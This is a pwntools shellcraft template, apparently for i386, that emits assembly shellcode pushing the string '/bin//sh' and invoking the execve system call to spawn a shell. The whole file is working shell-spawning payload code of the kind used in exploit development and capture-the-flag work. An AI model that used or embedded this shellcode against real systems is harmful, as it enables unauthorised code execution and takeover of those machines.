<% from pwnlib.shellcraft import i386 %>
<%docstring>
Execute /bin/sh
</%docstring>


    /*  Clear eax, ecx, edx */
    xor eax, eax
    push eax

    /*  Push '/bin//sh' */
${i386.pushstr("/bin//sh")}
    mov ecx, esp

    /*  execve("/bin//sh", {junk, 0}, {0}); */
    push eax
    push esp
    push esp
    push ecx
    push eax
    mov al, SYS_execve
    int 0x80

